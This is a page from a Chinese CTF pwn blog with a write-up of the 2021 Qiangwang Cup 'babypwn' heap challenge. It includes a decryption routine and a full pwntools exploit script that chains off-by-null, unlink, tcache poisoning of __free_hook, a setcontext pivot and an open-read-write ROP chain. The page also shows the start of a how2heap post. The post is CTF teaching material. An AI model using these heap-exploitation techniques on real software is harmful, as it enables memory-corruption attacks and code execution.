<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s Pwnhome">
<meta property="og:url" content="http://hornos3.github.com/page/3/index.html">
<meta property="og:site_name" content="CoLin&#39;s Pwnhome">
<meta property="og:locale">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh'
  };
</script>

  <title>CoLin's Pwnhome</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's Pwnhome</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94babypwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94babypwn/" class="post-title-link" itemprop="url">强网杯2021 pwn 赛题解析——babypwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:28:06" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:06+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这道题增加了沙箱机制，通过seccomp-tools可以轻松获取沙箱的具体内容。</p>
<p><img src="https://img-blog.csdnimg.cn/7a4279ec88e74e9cb4d47dca9c3a0456.png"><br>其中的重点就是禁用了execve系统调用，无法直接通过one_gadget、system等直接getshell。这种情况下最为常用的利用方式就是set_context函数，具体如何利用，往下看。</p>
<p>本题的逆向分析很简单，注意bss中结构体的识别：前8字节是地址，后8字节是大小。在show函数中发现了一个简单的加密函数：</p>
<p><img src="https://img-blog.csdnimg.cn/d9ef1b3c1668495bb168ed3f51841a9c.png"><br>其每一轮的计算如下图所示，红色部分是因为溢出而无法计算的部分，每一轮的计算结果就相当于是所有黄色部分对应位异或的结果。<br><img src="https://img-blog.csdnimg.cn/f14dc06b21fd48248692237b77a64de6.png"><br>那么这个函数应该如何解密呢？观察到每一轮的计算又可以分为3小轮，最后一轮是某个值与自身左移13位的异或。第二轮是另外一个值与自身右移17位的异或得到第三轮的初始值。第一轮是输入与输入自身左移5位的异或得到第二轮的初始值。如此设计解密算法也就不难了，相信了解一些算法的读者都能编写脚本。解密函数如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_bits</span>(<span class="params">value, start, end</span>):</span><br><span class="line">    <span class="keyword">return</span> (value &gt;&gt; start) &amp; ((<span class="number">1</span> &lt;&lt; (end - start)) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        low13 = get_bits(value, <span class="number">0</span>, <span class="number">13</span>)</span><br><span class="line">        mid13 = get_bits(value, <span class="number">13</span>, <span class="number">26</span>)</span><br><span class="line">        mid13 ^= low13</span><br><span class="line">        high6 = get_bits(value, <span class="number">26</span>, <span class="number">32</span>)</span><br><span class="line">        high6 ^= get_bits(mid13, <span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">        value = low13 + (mid13 &lt;&lt; <span class="number">13</span>) + (high6 &lt;&lt; <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">        high17 = get_bits(value, <span class="number">15</span>, <span class="number">32</span>)</span><br><span class="line">        low15 = get_bits(value, <span class="number">0</span>, <span class="number">15</span>)</span><br><span class="line">        low15 ^= get_bits(high17, <span class="number">2</span>, <span class="number">17</span>)</span><br><span class="line">        value = low15 + (high17 &lt;&lt; <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">        first5 = get_bits(value, <span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">        second5 = get_bits(value, <span class="number">5</span>, <span class="number">10</span>)</span><br><span class="line">        second5 ^= first5</span><br><span class="line">        third5 = get_bits(value, <span class="number">10</span>, <span class="number">15</span>)</span><br><span class="line">        third5 ^= second5</span><br><span class="line">        fourth5 = get_bits(value, <span class="number">15</span>, <span class="number">20</span>)</span><br><span class="line">        fourth5 ^= third5</span><br><span class="line">        fifth5 = get_bits(value, <span class="number">20</span>, <span class="number">25</span>)</span><br><span class="line">        fifth5 ^= fourth5</span><br><span class="line">        sixth5 = get_bits(value, <span class="number">25</span>, <span class="number">30</span>)</span><br><span class="line">        sixth5 ^= fifth5</span><br><span class="line">        last2 = get_bits(value, <span class="number">30</span>, <span class="number">32</span>)</span><br><span class="line">        last2 ^= get_bits(sixth5, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">        value = first5 + (second5 &lt;&lt; <span class="number">5</span>) + (third5 &lt;&lt; <span class="number">10</span>) + (fourth5 &lt;&lt; <span class="number">15</span>) + \</span><br><span class="line">            (fifth5 &lt;&lt; <span class="number">20</span>) + (sixth5 &lt;&lt; <span class="number">25</span>) + (last2 &lt;&lt; <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure>

<p>通过show函数，我们能够获取到堆块的地址。不过需要注意的是，show函数加密的并非堆块自身的地址，而是堆块前8字节的值。通过调试我们可以发现，在程序初始化时调用的seccomp系列函数会申请一些堆块，我们通过申请到这些堆块有可能使得堆块的前8字节是一个堆块地址，以此来获取堆区地址。</p>
<p>本题的libc环境是2.27版本，有机会改写钩子到setcontext函数【<strong>插一句：在笔者的2.31版本libc中，setcontext函数的栈迁移指令从<code>mov rsp, [rdi+0xA0]</code>被改成了<code>mov rsp,[rdx+0xA0]</code>，这使得本题在2.31环境下无法利用，因为在执行到这里的时候无法控制rdx的值</strong>】。自然而然地，我们容易想到使用unlink堆块重叠的利用方式。在chunk中写一个假chunk，在假chunk的prev_size写入这个chunk的地址，然后将fd和bk指针写到合适的位置，就能够触发unlink。和同年的easy_diary相比，利用难度还更低些。</p>
<p><img src="https://img-blog.csdnimg.cn/bbadd28a80ff448791bfc3028b498852.png"><br>这里需要注意一下edit函数中的一个看似奇怪的函数。这个函数在read之后调用，会将第一个出现的’\x11’字符替换为0x0。乍一看，这个字符并不是字符串的结束符，但转念一想，不难发现这是出题人在为我们创造off by null的条件：’\x11’很有可能是某个chunk的size的最低1字节。可以通过这个特性修改chunk的大小和prev_inuse位。由于chunk的大小被修改了，因此在这个chunk的最后面还需要写上一个有效的size值，最低位为1，以绕过检查。</p>
<p>在成功unlink之后，就可以利用堆块重叠修改tcache chunk的fd指针到__free_hook。将其改写到setcontext内部即可实现栈迁移。然后构造好ROP链，打开文件、读文件、写数据。在笔者的机器上，通过调试将rdx改为与rdi的值相等实现栈迁移，但不知何故打开flag文件总是失败。</p>
<p>exp:（基于20.04，且需要调试修改rdx的值）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./babypwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&#x27;../../../../ld/ld-2.27.so&#x27;, &#x27;./babypwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;: &quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    lodword = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line">    lodword = decrypt(lodword)</span><br><span class="line">    hidword = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line">    hidword = decrypt(hidword)</span><br><span class="line">    <span class="keyword">return</span> lodword + (hidword &lt;&lt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_bits</span>(<span class="params">value, start, end</span>):</span><br><span class="line">    <span class="keyword">return</span> (value &gt;&gt; start) &amp; ((<span class="number">1</span> &lt;&lt; (end - start)) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        low13 = get_bits(value, <span class="number">0</span>, <span class="number">13</span>)</span><br><span class="line">        mid13 = get_bits(value, <span class="number">13</span>, <span class="number">26</span>)</span><br><span class="line">        mid13 ^= low13</span><br><span class="line">        high6 = get_bits(value, <span class="number">26</span>, <span class="number">32</span>)</span><br><span class="line">        high6 ^= get_bits(mid13, <span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">        value = low13 + (mid13 &lt;&lt; <span class="number">13</span>) + (high6 &lt;&lt; <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">        high17 = get_bits(value, <span class="number">15</span>, <span class="number">32</span>)</span><br><span class="line">        low15 = get_bits(value, <span class="number">0</span>, <span class="number">15</span>)</span><br><span class="line">        low15 ^= get_bits(high17, <span class="number">2</span>, <span class="number">17</span>)</span><br><span class="line">        value = low15 + (high17 &lt;&lt; <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">        first5 = get_bits(value, <span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">        second5 = get_bits(value, <span class="number">5</span>, <span class="number">10</span>)</span><br><span class="line">        second5 ^= first5</span><br><span class="line">        third5 = get_bits(value, <span class="number">10</span>, <span class="number">15</span>)</span><br><span class="line">        third5 ^= second5</span><br><span class="line">        fourth5 = get_bits(value, <span class="number">15</span>, <span class="number">20</span>)</span><br><span class="line">        fourth5 ^= third5</span><br><span class="line">        fifth5 = get_bits(value, <span class="number">20</span>, <span class="number">25</span>)</span><br><span class="line">        fifth5 ^= fourth5</span><br><span class="line">        sixth5 = get_bits(value, <span class="number">25</span>, <span class="number">30</span>)</span><br><span class="line">        sixth5 ^= fifth5</span><br><span class="line">        last2 = get_bits(value, <span class="number">30</span>, <span class="number">32</span>)</span><br><span class="line">        last2 ^= get_bits(sixth5, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">        value = first5 + (second5 &lt;&lt; <span class="number">5</span>) + (third5 &lt;&lt; <span class="number">10</span>) + (fourth5 &lt;&lt; <span class="number">15</span>) + \</span><br><span class="line">            (fifth5 &lt;&lt; <span class="number">20</span>) + (sixth5 &lt;&lt; <span class="number">25</span>) + (last2 &lt;&lt; <span class="number">30</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">add(<span class="number">100</span>)                            <span class="comment"># chunk 0, used for leaking address</span></span><br><span class="line">chunk0_addr = show(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(chunk0_addr))</span><br><span class="line">add(<span class="number">0x100</span>)                          <span class="comment"># chunk #1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xF0</span>)                       <span class="comment"># chunk #2~8</span></span><br><span class="line">chunk1_addr = chunk0_addr + <span class="number">0x400</span></span><br><span class="line"></span><br><span class="line">payload = p64(chunk1_addr + <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x810</span> + <span class="number">0x30</span> - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(chunk1_addr - <span class="number">0x8</span>)</span><br><span class="line">payload += p64(chunk1_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)                           <span class="comment"># chunk #9</span></span><br><span class="line">add(<span class="number">0x100</span>)                          <span class="comment"># chunk #10</span></span><br><span class="line">add(<span class="number">0x20</span>)                           <span class="comment"># chunk #11, goalkeeper</span></span><br><span class="line">edit(<span class="number">9</span>, cyclic(<span class="number">0x28</span>))               <span class="comment"># this can change the chunk #9&#x27;s size from 0x511 to 0x500</span></span><br><span class="line">edit(<span class="number">9</span>, cyclic(<span class="number">0x20</span>) + p64(<span class="number">0x810</span> + <span class="number">0x30</span> - <span class="number">0x10</span>))        <span class="comment"># write correct prev_size</span></span><br><span class="line">edit(<span class="number">10</span>, cyclic(<span class="number">0xF0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">8</span> - i)                   <span class="comment"># delete chunk #2~8</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    add(<span class="number">0xF0</span>)                       <span class="comment"># recover chunk #1, 2</span></span><br><span class="line">add(<span class="number">0xF0</span> + <span class="number">0x100</span>)                   <span class="comment"># recover chunk #3</span></span><br><span class="line">main_arena = show(<span class="number">3</span>) - <span class="number">96</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">__malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">base = __malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">__free_hook = base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">setcontext = base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">openfile = base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">readfile = base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">writefile = base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">poprdi_ret = base + <span class="number">0x23B6A</span></span><br><span class="line">poprsi_ret = base + <span class="number">0x2601F</span></span><br><span class="line">poprdx_ret = base + <span class="number">0x142C92</span></span><br><span class="line">addrsp0x18_ret = base + <span class="number">0x349ea</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xF0</span> + <span class="number">0x100</span>)                   <span class="comment"># chunk #5</span></span><br><span class="line">edit(<span class="number">5</span>, cyclic(<span class="number">0xF0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(__free_hook))</span><br><span class="line">add(<span class="number">0xF0</span>)                           <span class="comment"># chunk #6</span></span><br><span class="line">add(<span class="number">0xF0</span>)                           <span class="comment"># chunk #7, to __free_hook</span></span><br><span class="line">edit(<span class="number">7</span>, p64(setcontext + <span class="number">0x3D</span>))     <span class="comment"># change __free_hook to setcontext + 0x3D, ready for stack pivoting</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xF0</span> + <span class="number">0x100</span>)                   <span class="comment"># chunk #8</span></span><br><span class="line">chunk8_addr = chunk1_addr + <span class="number">0x410</span></span><br><span class="line"></span><br><span class="line">ROP = <span class="string">b&#x27;/flag&#x27;</span>.ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>)     <span class="comment"># 0x0</span></span><br><span class="line">ROP += p64(chunk8_addr + <span class="number">0x10</span>)          <span class="comment"># 0x30</span></span><br><span class="line">ROP += p64(poprsi_ret)                  <span class="comment"># 0x38</span></span><br><span class="line">ROP += p64(<span class="number">2</span>)                           <span class="comment"># 0x40</span></span><br><span class="line">ROP += p64(openfile)                    <span class="comment"># 0x48</span></span><br><span class="line">ROP += p64(poprdi_ret)                  <span class="comment"># 0x50</span></span><br><span class="line">ROP += p64(<span class="number">3</span>)                           <span class="comment"># 0x58</span></span><br><span class="line">ROP += p64(poprsi_ret)                  <span class="comment"># 0x60</span></span><br><span class="line">ROP += p64(chunk8_addr + <span class="number">0xF0</span>)          <span class="comment"># 0x68</span></span><br><span class="line">ROP += p64(poprdx_ret)                  <span class="comment"># 0x70</span></span><br><span class="line">ROP += p64(<span class="number">0x30</span>)                        <span class="comment"># 0x78</span></span><br><span class="line">ROP += p64(readfile)                    <span class="comment"># 0x80</span></span><br><span class="line">ROP += p64(poprdi_ret)                  <span class="comment"># 0x88</span></span><br><span class="line">ROP += p64(<span class="number">1</span>)                           <span class="comment"># 0x90</span></span><br><span class="line">ROP += p64(addrsp0x18_ret)              <span class="comment"># 0x98</span></span><br><span class="line">ROP += p64(chunk8_addr + <span class="number">0x40</span>)          <span class="comment"># 0xA0</span></span><br><span class="line">ROP += p64(poprdi_ret)                  <span class="comment"># 0xA8</span></span><br><span class="line">ROP += p64(<span class="number">0xdeadbeef</span>)                  <span class="comment"># 0xB0</span></span><br><span class="line">ROP += p64(poprsi_ret)                  <span class="comment"># 0xB8</span></span><br><span class="line">ROP += p64(chunk8_addr + <span class="number">0xF0</span>)          <span class="comment"># 0xC0</span></span><br><span class="line">ROP += p64(poprdx_ret)                  <span class="comment"># 0xC8</span></span><br><span class="line">ROP += p64(<span class="number">0x30</span>)                        <span class="comment"># 0xD0</span></span><br><span class="line">ROP += p64(writefile)                   <span class="comment"># 0xD8</span></span><br><span class="line">edit(<span class="number">8</span>, ROP)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-6/" class="post-title-link" itemprop="url">how2heap 深入学习(6)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:28:05" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:05+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>how2heap下载网址: <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">传送门</a><br>Glibc源码查看网址：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3516">传送门</a><br>参考书籍：CTF竞赛权威指南-pwn篇</p>
<p>测试环境：Ubuntu 18.04<br>Glibc 版本：Ubuntu GLIBC 2.27-3ubuntu1.5</p>
<p>按照顺序，本文将分析glibc 2.27文件夹下的前6个源码，其中主要分析fastbin_reverse_into_tcache，house_of_botcake，house_of_lore。<br>如果本文的分析有任何错漏之处，还请各位读者不吝赐教，不胜感激。</p>
